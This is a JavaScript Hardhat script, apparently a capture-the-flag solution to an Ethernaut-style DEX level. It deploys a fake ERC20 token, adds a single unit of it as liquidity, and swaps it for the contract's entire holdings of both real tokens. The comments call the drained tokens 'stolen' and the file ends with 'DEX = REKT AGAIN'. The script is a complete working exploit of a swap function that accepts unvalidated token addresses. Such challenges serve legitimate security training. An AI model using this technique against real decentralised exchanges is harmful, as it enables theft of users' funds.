const { BigNumber } = require("ethers");
const { ethers } = require("hardhat");

const INSTANCE = '0xEfe8E727237ACA5CF732e8b5524fdb56bf514BBE'
const abi = [
    "function add_liquidity(address token_address, uint amount) public",
    "function swap(address from, address to, uint amount) public",
    "function approve(address spender, uint amount) public",
    "function balanceOf(address token, address account) public view returns (uint)",
    "function token1() public view returns (address)",
    "function token2() public view returns (address)"
]

async function hack(contract, signer) {
    // Create a fake token that we'll be adding to the DEX and trading.
    // In the constructor of the contract, mint ourselves a large number of tokens and approve the DEX to save txs later.
    const FakeTokenContract = await ethers.getContractFactory('FakeToken')
    const fakeTokenContract = await FakeTokenContract.deploy(contract.address)
    await fakeTokenContract.deployed()
    console.log(`FakeToken Contract Deployed To: ${fakeTokenContract.address}`)

    // Add 1 token of liquidity for the Fake Token, making it incredibly rare and valuable.
    const liquidityTx = await contract.add_liquidity(fakeTokenContract.address, BigNumber.from(1)) 
    await liquidityTx.wait()
    console.log(`Added 1 FakeToken to the DEX.`)

    // Approve contract for full supply (110) of each token, to get it over with.
    const approveTx = await contract.approve(contract.address, 110);
    await approveTx.wait();
    console.log('Tokens approved for trading.')

    // Now we can trade the fake token for Token 1. 
    // The price ratio is 100:1, so we'll just need to swap 1 Fake Token for all of the Token 1.
    const swap1Tx = await contract.swap(fakeTokenContract.address, await contract.token1(), BigNumber.from(1))
    await swap1Tx.wait()
    console.log(`All of Token 1 stolen.`)

    // Now we can trade the fake token for Token 2.
    // The price ratio is 100:2, so we'll now need to cough up 2 Fake Tokens for all of the Token 2.
    const swap2Tx = await contract.swap(fakeTokenContract.address, await contract.token2(), BigNumber.from(2))
    await swap2Tx.wait()
    console.log(`All of Token 2 stolen.`)

    // Let's confirm that all went according to plan.
    const token1Balance = await contract.balanceOf(await contract.token1(), contract.address)
    console.log(`DEX Token 1 Balance: ${token1Balance}`)
    const token2Balance = await contract.balanceOf(await contract.token2(), contract.address)
    console.log(`DEX Token 2 Balance: ${token2Balance}`)

    console.log('DEX = REKT AGAIN')
}

const signer = ethers.getSigner().then(signer => {
    const contract = new ethers.Contract(INSTANCE, abi, signer);
    console.log('Contract Setup Completed.')
    hack(contract, signer)
})